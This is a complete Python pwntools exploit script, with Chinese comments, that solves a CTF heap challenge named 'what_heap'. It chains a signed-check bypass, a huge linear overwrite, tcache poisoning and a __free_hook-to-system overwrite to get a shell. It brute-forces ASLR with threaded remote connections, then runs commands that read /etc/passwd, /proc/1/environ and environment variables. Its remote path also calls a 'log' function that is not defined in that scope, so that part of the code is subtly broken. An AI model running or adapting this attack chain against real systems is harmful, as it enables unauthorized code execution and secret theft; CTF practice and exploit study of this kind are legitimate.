#!/usr/bin/env python3
"""what_heap (PWN-01) — 隐藏菜单 5 有符号检查绕过 → BSS→堆线性覆写 + tcache poison → __free_hook=system。

用法:  python3 solve.py HOST PORT [threads] [tmax_sec]   # 决赛靶机（brk-ASLR 暴力，P~1/8192）
       TARGET=host:port python3 solve.py [threads] [tmax_sec]
       python3 solve.py --local [./wh_local]             # 本地单发（需 2.27 运行环境，见 SOLVE.md 本地验证）
前置:  附件解压到 CWD（libc.so.6 自动 rglob 定位，偏移全部动态计算）。

链条: 菜单 5("?") scanf("%d") 有符号检查 n<=0x20 → n<0 通过；read(0, 0x602190, (u32)n)
取 n=-1 得 ~4GB 线性写，起点 .bss 尾。非 PIE，brk 堆紧随其后：当 brk-ASLR 偏移 R=0
时堆恰在 0x603000，4GB 写直接覆盖整个堆（含 tcache_perthread_struct）。
prologue 用 tcache fd 泄漏堆基探测 R=0；命中后：伪造 A 尺寸 0x421 free 入 unsorted →
largebin 头指针泄 libc → 覆写 tcache counts/entries → malloc(8) 拿 __free_hook →
system + free("/bin/sh")。
"""
import os
import re
import sys
import threading
import time
from pathlib import Path

from pwn import ELF, context, p64, process, remote, u64

# ------------------------------------------------------------- binary const ---
H = 0x603000            # brk-ASLR 偏移 R=0 时的堆基（紧接 .bss 尾页）；remote 模式以它为命中判据
BASE = 0x602190         # 魔法 read 目的地址（.bss 尾，逆向自 0x400cf3 mov esi,0x602190）

# 堆内偏移（相对真实堆基 h）：2.27 tcache_perthread_struct 0x250 + malloc(256)=0x110×2
# 的固定布局，换 libc 版本即失效（连同 K_LEAK），届时按 SOLVE.md 重推。
# tcache @ h+0x10 | A(idx0) 块头 @ h+0x250 | B(idx1) @ h+0x360 | top @ h+0x470

# ------------------------------------------------------------- libc offsets ---
_libcs = sorted(Path(".").rglob("libc.so.6"))
assert _libcs, "libc.so.6 not found under CWD (unzip attachment first)"
libc = ELF(str(_libcs[0]), checksec=False)
OFF_SYSTEM = libc.sym["system"]
OFF_FREE_HOOK = libc.sym["__free_hook"]
# main_arena 无导出符号；x86-64 glibc 恒有 main_arena = __malloc_hook+0x10。
# 泄漏值 = largebin[64] 头（A 尺寸 0x420 经 unsorted→largebin→split 后残留的 fd）
# = main_arena + 0x450。对本附件 libc(2.27-3ubuntu1.6) 算出 0x3ec090，实测吻合。
K_LEAK = libc.sym["__malloc_hook"] + 0x10 + 0x450

args = sys.argv[1:]
if args and args[0] == "--local":
    LOCAL_BIN = args[1] if len(args) > 1 else "./wh_local"
    NT, TMAX = 1, 0
else:
    LOCAL_BIN = None
    if len(args) >= 2 and not args[0].isdigit():
        HOST, PORT, args = args[0], int(args[1]), args[2:]
    elif os.environ.get("TARGET", "").count(":") == 1:
        host, _, port = os.environ["TARGET"].rpartition(":")
        HOST, PORT = host, int(port)
    else:
        sys.exit("usage: python3 solve.py host port [threads] [tmax_sec]\n"
                 "   or: TARGET=host:port python3 solve.py [threads] [tmax_sec]\n"
                 "   or: python3 solve.py --local [./wh_local]")
    NT = int(args[0]) if args and args[0].isdigit() else 20
    TMAX = int(args[1]) if len(args) > 1 and args[1].isdigit() else 3600

context.arch = "amd64"
context.log_level = "CRITICAL"


def off(a):
    return a - BASE


# add(256)×2, free B, free A, add → A(0x603260) 的 tcache fd=B, show0 → B=base+0x370；
# add(256) → B 回来, delete(1) → B 回 tcache。8 次堆操作零写入；
# show 泄漏兼作堆基探测器（0x370 页偏移特征）。
PROLOGUE = (b"1\n256\n1\n256\n3\n001\n3\n000\n1\n256\n4\n000\n"
            b"1\n256\n3\n001\n")


def base_of(p):
    """跑 prologue，返回堆基（0x603000 当且仅当 brk 与 bss 相接），失败 None。"""
    p.send(PROLOGUE)
    o = b""
    t = time.time()
    while time.time() - t < 8:
        try:
            d = p.recv(4096, timeout=1)
        except EOFError:
            break
        if not d:
            break
        o += d
        if o.count(b"choice>>") >= 9:
            break
    for seg in o.split(b"index >>\n")[1:]:
        line = seg.split(b"\n", 1)[0]
        if 2 <= len(line) <= 6 and (int.from_bytes(line, "little") & 0xFFF) == 0x370:
            return int.from_bytes(line, "little") - 0x370
    return None


# ------------------------------------------------------------ menu helpers ---
def sync(p, timeout=5):
    return p.recvuntil(b"choice>>", timeout=timeout)


def sendval(p, v):
    p.send(b"%03d" % v)


def add(p, size):
    p.sendline(b"1")
    p.recvuntil(b"size >>", timeout=5)
    sendval(p, size)
    return sync(p)


def edit(p, idx, data):
    p.sendline(b"2")
    p.recvuntil(b"index >>", timeout=5)
    sendval(p, idx)
    p.recvuntil(b"input >>", timeout=5)
    p.send(data)
    return sync(p)


def delete(p, idx):
    p.sendline(b"3")
    p.recvuntil(b"index >>", timeout=5)
    sendval(p, idx)
    return sync(p)


def show(p, idx):
    p.sendline(b"4")
    p.recvuntil(b"index >>", timeout=5)
    sendval(p, idx)
    d = p.recvuntil(b"choice>>", timeout=5)
    return d.split(b"\n", 2)[1]


# 前导空白被无缓冲 stdin 的 scanf("%d") 逐字节 read(1) 消耗、不进数字缓冲 →
# 把裸 read() 推迟到整个 payload 已进 socket 缓冲（避免 TCP 短读），
# 且不触发 glibc scanf 内部 malloc/realloc。
# 数字 token "-" + 300 个 0 + "1"（302 字符）控制在 1024 内：更长的 token 会让
# scanf malloc(2048)+realloc(4096)，在被破坏的堆上直接 "realloc(): invalid next size"。
ZEROS = 300
SPACES = 3000


def magic(p, payload):
    p.sendline(b"5")
    p.recvuntil(b"magic number>>", timeout=5)
    p.send(b" " * SPACES + b"-" + b"0" * ZEROS + b"1\n" + payload)
    return sync(p, timeout=8)


def magic1_payload(h):
    """h = 真实堆基。整体覆写 .bss尾→堆：清零 tcache（B 的残留条目随之消失）、
    伪造 A 尺寸 0x421、top 0x100001、以及 free 校验所需的 next-size 链。"""
    pl = bytearray(0x1520)
    for a, v in [(h + 0x250 + 8, 0x421), (h + 0x360 + 8, 0x100001),
                 (h + 0x470 + 8, 0x100001),
                 (h + 0x670 + 8, 0x21), (h + 0x690 + 8, 0x21)]:
        pl[off(a):off(a) + 8] = p64(v)
    return bytes(pl)


def magic2_payload(free_hook, h):
    """tcache_perthread_struct（2.27: 64×1B counts + 64×8B entries）@ h+0x10:
    counts[0]=1 且 entries[0]=free_hook → 下一次 malloc(8) 直接返回 free_hook。"""
    pl = bytearray(0xF00)
    pl[off(h + 0x10)] = 1
    pl[off(h + 0x10 + 0x40):off(h + 0x10 + 0x40) + 8] = p64(free_hook)
    return bytes(pl)


# ------------------------------------------------------------- full chain ---
def pwn_after(p, logf=None, h=H):
    """在已跑完 prologue 的连接上打完整链条（切勿重复跑 prologue，会破坏堆状态）。
    h = 进程真实堆基：remote 模式命中判据 b==H 后走默认值，行为不变；local 模式传
    prologue 泄露值。成功返回 shell 输出字节，失败返回 None。"""
    lg = (lambda m: logf(m)) if logf else (lambda m: None)
    try:
        magic(p, magic1_payload(h))
        lg("magic1 ok")
        delete(p, 0)          # free A（伪尺寸 0x420）→ unsorted
        lg("delete0 ok")
        add(p, 256)           # unsorted→largebin→split，A 回到 idx0，fd/bk 残留 libc 指针
        lg("add256 ok")
        c = show(p, 0)
        lg("show raw=%r" % (c[:16],))
        if len(c) < 6:
            # puts 停在 libc 指针内嵌 NUL（libc 基址 byte1==0，约 1/256）→ 弃权重试
            lg("leak truncated by NUL (len=%d) -> discard" % len(c))
            return None
        leak = u64(c[:6].ljust(8, b"\x00"))
        libc_base = leak - K_LEAK
        free_hook = libc_base + OFF_FREE_HOOK
        system = libc_base + OFF_SYSTEM
        lg("leak=%#x libc=%#x free_hook=%#x system=%#x" % (leak, libc_base, free_hook, system))
        if libc_base & 0xFFF:
            lg("libc base not page aligned -> bad leak")
            return None
        magic(p, magic2_payload(free_hook, h))
        lg("magic2 ok")
        add(p, 8)             # → __free_hook（首个空槽 = idx1）
        lg("add8 ok")
        edit(p, 1, p64(system))
        lg("edit1 ok")
        edit(p, 0, b"/bin/sh\x00".ljust(256, b"\x00"))
        lg("edit0 ok")
        p.sendline(b"3")
        p.recvuntil(b"index >>", timeout=5)
        sendval(p, 0)         # free("/bin/sh") → system("/bin/sh")
        time.sleep(0.3)
        # 拿 shell 后的找 flag 清单。远端镜像极简：只有 /bin/sh 内建 + ls + cat
        # （无 id/env/tr/find/grep/head/ps，/proc 未挂载），只许用这些、不用管道。
        # 实证（决赛测试赛）：flag 在环境变量 FLAG/DASFLAG 与 /flag 各有一份。
        try:
            p.sendline(b"echo __RDY__")
            p.recvuntil(b"__RDY__", timeout=5)
        except Exception:
            lg("shell sync failed")
        cmds = [
            b"set",
            b"echo FLAGVAR=$FLAG DASFLAG=$DASFLAG GZ=$GZCTF_FLAG DAS=$DASCTF_FLAG",
            b"cat /flag /flag.txt /root/flag /workspace/flag /opt/flag /srv/flag",
            b"ls -la /",
            b"ls -la /workspace /opt /srv /tmp /root /home",
            b"cat /proc/1/environ",
            b"cat /etc/passwd /etc/environment",
        ]
        parts = []
        for i, c in enumerate(cmds):
            mk = b"__M%d__" % i
            try:
                p.sendline(c + b" ; echo " + mk)
                d = p.recvuntil(mk, timeout=8)
            except Exception as e:
                d = b"ERR:" + repr(e).encode()
            parts.append(b"\n$ " + c + b"\n" + d)
            time.sleep(0.2)
        return b"PWNED_OK\n" + b"".join(parts)
    except Exception as e:
        lg("FAIL %r" % (e,))
        return None


# ------------------------------------------------------------ local driver ---
def run_local():
    """本地单发：用 prologue 泄露到的真实堆基替代 0x603000 常量驱动整链。
    链条成立当且仅当堆落在魔法线性写窗口 [BASE, BASE+0x1520) 内（唯一满足的页是
    0x603000）；ld 直启时 brk 跟随作为 main 的 ld.so（Rosetta 落 0x555555554000），
    不与目标 .bss 相接，窗口罩不住 → 带诊断退出。各本地姿势的边界见 SOLVE.md。"""
    log = lambda m: print("[local] %s" % m, flush=True)
    log("K_LEAK=%#x system=%#x __free_hook=%#x (from %s)"
        % (K_LEAK, OFF_SYSTEM, OFF_FREE_HOOK, _libcs[0].name))
    p = process(LOCAL_BIN)
    b = base_of(p)
    if b is None:
        p.close()
        sys.exit("[-] no heap leak from prologue (binary crashed or no 0x370 signature)")
    log("heap base = %#x" % b)
    if not (BASE <= b and b + 0x6a0 <= BASE + 0x1520):
        p.close()
        sys.exit("[-] heap %#x unreachable from linear write [%#x, %#x): this runtime "
                 "places brk away from the target's .bss (ld direct-launch: brk follows "
                 "ld.so as main) — magic1 cannot touch the heap; see SOLVE.md 本地验证"
                 % (b, BASE, BASE + 0x1520))
    out = pwn_after(p, log, h=b)
    print((out or b"<failed>").decode(errors="replace"))
    p.close()
    return 0 if out and b"PWNED_OK" in out else 1


# ------------------------------------------------------------ brute driver ---
lock = threading.Lock()
found = threading.Event()
st = {"n": 0, "hit": 0, "err": 0, "r0": 0, "flag": None}
t0 = time.time()

FLAG_RE = re.compile(rb"DASCTF\{[^}\r\n]{1,120}\}")


def worker(wid):
    while not found.is_set() and time.time() - t0 < TMAX:
        p = None
        try:
            p = remote(HOST, PORT, timeout=6)
            b = base_of(p)
            with lock:
                st["n"] += 1
                n_now = st["n"]
                if n_now % 200 == 0:
                    log('n=%d rate=%.1f/s err=%d hits=%d r0=%d'
                        % (n_now, n_now / (time.time() - t0), st["err"], st["hit"], st["r0"]))
            if b is None:
                with lock:
                    st["r0"] += 1
                p.close()
                continue
            if b != H:
                p.close()
                continue
            with lock:
                st["hit"] += 1
            lines = []

            def lg(m, lines=lines):
                lines.append("%7.2f %s" % (time.time() - t0, m))

            lg("*** HIT wid=%d base=%#x attempt=%d ***" % (wid, b, n_now))
            out = pwn_after(p, lg)
            lg("result=%r" % (out[:400] if out else out,))
            with lock:
                log("\n".join(lines))
            if out and b"PWNED_OK" in out:
                fn = "hit_%d.bin" % int(time.time())
                open(fn, "wb").write(out)
                log("SHELL OK -> %s" % fn)
                m = FLAG_RE.search(out) or re.search(
                    rb"[Ff][Ll][Aa][Gg]\{[^}\r\n]{1,120}\}", out)
                if m:
                    flag = m.group(0).decode()
                    open("FLAG.txt", "w").write(flag + "\n")
                    log("FLAG FOUND: %s" % flag)
                    with lock:
                        st["flag"] = flag
                    found.set()
            p.close()
        except Exception:
            with lock:
                st["err"] += 1
            try:
                if p:
                    p.close()
            except Exception:
                pass
            time.sleep(0.2)


def run_remote():
    print('[%7.1f] target=%s:%d threads=%d tmax=%ds  P(hit)~1/8192, measured ~1/10700'
          % (0.0, HOST, PORT, NT, TMAX), flush=True)
    ths = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(NT)]
    for t in ths:
        t.start()
    while any(t.is_alive() for t in ths) and not found.is_set():
        time.sleep(2)
    el = time.time() - t0
    log("DONE n=%d hits=%d err=%d r0=%d elapsed=%.0fs rate=%.1f/s"
        % (st["n"], st["hit"], st["err"], st["r0"], el, st["n"] / max(el, 1)))
    flag = st["flag"]
    if flag:
        inner = flag[flag.index("{") + 1:flag.rindex("}")]
        print()
        print("=" * 64)
        print("[+] FLAG        : %s" % flag)
        print("[+] SUBMIT THIS : %s" % inner)
        print("=" * 64)
        return 0
    print("[-] no flag within tmax; see SOLVE.md failure branches", flush=True)
    return 3


if __name__ == "__main__":
    sys.exit(run_local() if LOCAL_BIN else run_remote())
